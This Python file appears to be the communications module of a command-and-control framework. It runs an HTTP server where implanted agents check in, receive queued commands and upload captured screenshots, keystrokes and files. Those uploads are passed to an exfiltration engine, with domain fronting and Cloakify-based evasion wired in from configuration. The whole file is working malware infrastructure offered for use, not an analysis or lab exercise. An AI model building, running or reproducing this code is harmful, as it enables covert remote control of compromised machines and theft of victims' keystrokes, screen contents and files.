import socket
import requests
import json
import threading
import time
import logging
from queue import Queue, Empty
from core.config_manager import ConfigManager
from core.session_manager import SessionManager
from evasion.cloakify_exfil import CloakifyExfil

class CommsManager:
    def __init__(self, config_manager: ConfigManager, session_manager: SessionManager, exfil_engine):
        self.config = config_manager
        self.session_manager = session_manager
        self.exfil_engine = exfil_engine
        self.c2_address = self.config.get('c2.domain_fronting.cdn_domain')
        self.running = False
        self.logger = logging.getLogger(__name__)
        
        # Communication queues
        self.command_queue = Queue()
        self.data_queue = Queue()
        
        # Initialize cloakify exfiltration with config_manager
        try:
            self.cloakify = CloakifyExfil(config_manager)
        except Exception as e:
            self.logger.warning(f"Failed to initialize CloakifyExfil: {str(e)}")
            self.cloakify = None
        
        # Threading components
        self.threads = []
        
        # HTTP server for agent communication
        self.server_port = self.config.get('c2.http_port', 8080)  # Changed to c2.http_port
        self.server_host = self.config.get('c2.host', '0.0.0.0')
        self.server_socket = None

    def start(self):
        """Start the communication manager and all its components"""
        if self.running:
            self.logger.warning("Communication manager is already running")
            return False
            
        try:
            self.logger.info("Starting communication manager...")
            self.running = True
            
            # Start HTTP server for agent communication
            server_thread = threading.Thread(target=self._start_http_server)
            server_thread.daemon = True
            server_thread.start()
            self.threads.append(server_thread)
            
            # Start command processing thread
            command_thread = threading.Thread(target=self._process_commands)
            command_thread.daemon = True
            command_thread.start()
            self.threads.append(command_thread)
            
            # Start data processing thread
            data_thread = threading.Thread(target=self._process_data)
            data_thread.daemon = True
            data_thread.start()
            self.threads.append(data_thread)
            
            self.logger.info("Communication manager started successfully")
            return True
        except Exception as e:
            self.logger.error(f"Failed to start communication manager: {str(e)}")
            self.running = False
            return False

    def stop(self):
        """Stop the communication manager and all its components"""
        if not self.running:
            self.logger.warning("Communication manager is not running")
            return False
            
        try:
            self.logger.info("Stopping communication manager...")
            self.running = False
            
            # Close server socket if open
            if self.server_socket:
                self.server_socket.close()
                
            # Wait for all threads to finish
            for thread in self.threads:
                if thread.is_alive():
                    thread.join(timeout=5)
                    
            self.logger.info("Communication manager stopped successfully")
            return True
        except Exception as e:
            self.logger.error(f"Failed to stop communication manager: {str(e)}")
            return False

    def _start_http_server(self):
        """Start HTTP server for agent communication"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.server_host, self.server_port))
            self.server_socket.listen(5)
            
            self.logger.info(f"HTTP server listening on {self.server_host}:{self.server_port}")
            
            while self.running:
                try:
                    client_socket, address = self.server_socket.accept()
                    client_thread = threading.Thread(
                        target=self._handle_client_request,
                        args=(client_socket, address)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                except Exception as e:
                    if self.running:  # Only log if not shutting down
                        self.logger.error(f"Error accepting client connection: {str(e)}")
                        
        except Exception as e:
            self.logger.error(f"HTTP server error: {str(e)}")
        finally:
            if self.server_socket:
                self.server_socket.close()

    def _handle_client_request(self, client_socket, address):
        """Handle incoming HTTP requests from agents"""
        try:
            # Receive HTTP request
            request = client_socket.recv(4096).decode('utf-8')
            
            # Parse HTTP request
            lines = request.split('\n')
            if len(lines) == 0:
                return
                
            # Extract request line
            request_line = lines[0].strip()
            parts = request_line.split(' ')
            if len(parts) < 3:
                return
                
            method, path, _ = parts
            
            # Handle different endpoints
            if method == 'POST' and path == '/api/checkin':
                self._handle_checkin(client_socket, request)
            elif method == 'POST' and path == '/api/data':
                self._handle_data_upload(client_socket, request)
            elif method == 'GET' and path.startswith('/api/commands'):
                self._handle_command_request(client_socket, request)
            else:
                # Send 404 response
                response = "HTTP/1.1 404 Not Found\r\n\r\n"
                client_socket.send(response.encode('utf-8'))
                
        except Exception as e:
            self.logger.error(f"Error handling client request: {str(e)}")
        finally:
            client_socket.close()

    def _handle_checkin(self, client_socket, request):
        """Handle agent checkin"""
        try:
            # Extract request body
            body_start = request.find("\r\n\r\n")
            if body_start == -1:
                return
                
            body = request[body_start+4:]
            data = json.loads(body)
            
            # Get or create session
            session_id = data.get('session_id')
            if not session_id:
                # Create new session
                session_id = self.session_manager.create_session(data)
                
            # Update session
            self.session_manager.update_session(session_id, {'last_seen': time.time()})
            
            # Send response with session ID
            response_data = {
                'session_id': session_id,
                'status': 'active'
            }
            
            response = "HTTP/1.1 200 OK\r\n"
            response += "Content-Type: application/json\r\n"
            response += f"Content-Length: {len(json.dumps(response_data))}\r\n"
            response += "\r\n"
            response += json.dumps(response_data)
            
            client_socket.send(response.encode('utf-8'))
            
        except Exception as e:
            self.logger.error(f"Error handling checkin: {str(e)}")
            # Send error response
            response = "HTTP/1.1 500 Internal Server Error\r\n\r\n"
            client_socket.send(response.encode('utf-8'))

    def _handle_data_upload(self, client_socket, request):
        """Handle data upload from agent"""
        try:
            # Extract request body
            body_start = request.find("\r\n\r\n")
            if body_start == -1:
                return
                
            body = request[body_start+4:]
            data = json.loads(body)
            
            # Extract data
            session_id = data.get('session_id')
            data_type = data.get('type')
            payload = data.get('payload')
            
            # Queue for processing
            self.data_queue.put({
                'session_id': session_id,
                'type': data_type,
                'payload': payload
            })
            
            # Send response
            response_data = {'status': 'received'}
            
            response = "HTTP/1.1 200 OK\r\n"
            response += "Content-Type: application/json\r\n"
            response += f"Content-Length: {len(json.dumps(response_data))}\r\n"
            response += "\r\n"
            response += json.dumps(response_data)
            
            client_socket.send(response.encode('utf-8'))
            
        except Exception as e:
            self.logger.error(f"Error handling data upload: {str(e)}")
            # Send error response
            response = "HTTP/1.1 500 Internal Server Error\r\n\r\n"
            client_socket.send(response.encode('utf-8'))

    def _handle_command_request(self, client_socket, request):
        """Handle command request from agent"""
        try:
            # Extract session ID from query parameters
            query_start = request.find('?')
            session_id = None
            
            if query_start != -1:
                query_part = request[query_start+1:request.find('\r\n', query_start)]
                params = query_part.split('&')
                for param in params:
                    if param.startswith('session_id='):
                        session_id = param[11:]
                        break
            
            if not session_id:
                # Send error response
                response = "HTTP/1.1 400 Bad Request\r\n\r\n"
                client_socket.send(response.encode('utf-8'))
                return
                
            # Get pending commands for this session
            commands = self.session_manager.get_pending_commands(session_id)
            
            # Send response
            response_data = {
                'commands': commands,
                'count': len(commands)
            }
            
            response = "HTTP/1.1 200 OK\r\n"
            response += "Content-Type: application/json\r\n"
            response += f"Content-Length: {len(json.dumps(response_data))}\r\n"
            response += "\r\n"
            response += json.dumps(response_data)
            
            client_socket.send(response.encode('utf-8'))
            
            # Mark commands as sent
            for command in commands:
                self.session_manager.update_command_status(command['id'], 'sent')
                
        except Exception as e:
            self.logger.error(f"Error handling command request: {str(e)}")
            # Send error response
            response = "HTTP/1.1 500 Internal Server Error\r\n\r\n"
            client_socket.send(response.encode('utf-8'))

    def _process_data(self):
        """Process data from the queue"""
        try:
            while self.running:
                try:
                    # Get data from queue with timeout
                    data_item = self.data_queue.get(timeout=1)
                    
                    # Process the data
                    session_id = data_item.get('session_id')
                    data_type = data_item.get('type')
                    payload = data_item.get('payload')
                    
                    if session_id and data_type and payload:
                        # Store data in database via session manager
                        self.session_manager.store_data(session_id, data_type, payload)
                        self.logger.info(f"Processed data for session {session_id}: {data_type}")
                        
                        # Optionally exfiltrate data immediately if needed
                        if self.exfil_engine and data_type in ['screenshot', 'keystrokes', 'files']:
                            # Use the exfil_engine directly instead of exfil_queue
                            self.exfil_engine.process_exfil_data(session_id, data_type, payload)
                    
                    self.data_queue.task_done()
                except Empty:
                    # Queue is empty, just continue
                    continue
                except Exception as e:
                    if self.running:  # Only log if not shutting down
                        self.logger.error(f"Error processing data: {str(e)}")
        except Exception as e:
            self.logger.error(f"Data processing thread error: {str(e)}")

    def _process_commands(self):
        """Process commands from the queue"""
        try:
            while self.running:
                try:
                    # Get command from queue with timeout
                    command_data = self.command_queue.get(timeout=1)
                    
                    # Process the command
                    session_id = command_data.get('session_id')
                    command = command_data.get('command')
                    
                    if session_id and command:
                        # Add command to session
                        self.session_manager.add_command_to_session(session_id, command)
                        self.logger.info(f"Added command to session {session_id}: {command}")
                    
                    self.command_queue.task_done()
                except Empty:
                    # Queue is empty, just continue
                    continue
                except Exception as e:
                    if self.running:  # Only log if not shutting down
                        self.logger.error(f"Error processing command: {str(e)}")
        except Exception as e:
            self.logger.error(f"Command processing thread error: {str(e)}")

    def dispatch_command(self, session_id, command):
        """Dispatch a command to a session"""
        try:
            command_data = {
                'session_id': session_id,
                'command': command
            }
            self.command_queue.put(command_data)
            self.logger.info(f"Command dispatched to session {session_id}: {command}")
            return True
        except Exception as e:
            self.logger.error(f"Failed to dispatch command: {str(e)}")
            return False
